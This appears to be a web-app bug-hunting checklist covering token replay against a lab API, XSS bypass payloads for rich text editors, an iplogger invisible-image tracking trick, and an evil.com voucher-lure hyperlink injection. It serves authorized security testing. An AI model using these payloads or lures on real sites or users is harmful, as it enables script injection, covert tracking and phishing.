---
tags:
  - web_hunting
  - logic-bugs
  - web-app-security
---
- [ ] Blind [[XSS|XSS]]
- [ ] Replay Attacks
    
    ```python
    # Try token Re-Use
    # U send Message 
    PUT /v1/api/messages/send?token=RWFzdGVyIGVnZyEgWW91RhdGEg=
    HTTP/1.1
    Host: vulnlab.com
    Content-Type: application/json
    {‘msg’: ‘Hi there! I will meet you at my place at 9pm today..’}
    
    --------------------------------------
    # U Then logout
    GET /v1/api/messages/logout?token=RWFzdGVyIGVnZyEgWW91RhdGEg=
    HTTP/1.1
    Host: vulnlab.com
    Content-Type: application/json 
    ---------------------------------------------------------
    We can then try to resend the request multiple times using the old token but with
    different messages.
    
    If the request was successful and no different status code was returned, it means
    we are able to flood the application using the session data of an old user.
    ```
    
- [ ] Markup Language? try [**Create A picture that steals Data**](https://medium.com/@iframe_h1/a-picture-that-steals-data-ff604ba1012)
    
    ```python
    Go to <https://iplogger.org/>
    choose invisible image 
    send the message 
    ```
    
- [ ] [[XSS|XSS]] in email section
- [ ] **XSS Bypass for Rich Text Editors**
    
    ```js
    First, try all the built-in functions like bold, links, and embedded images.
    
    <</p>iframe src=javascript:alert()//
    <a href="aaa:bbb">x</a>
    <a href="j%26Tab%3bavascript%26colon%3ba%26Tab%3blert()">x</a>
    
    [Click on me to claim 100$ vouchers](<https://evil.com>) -> Hyperlink Injection
    ```
- [ ] [[IDOR]]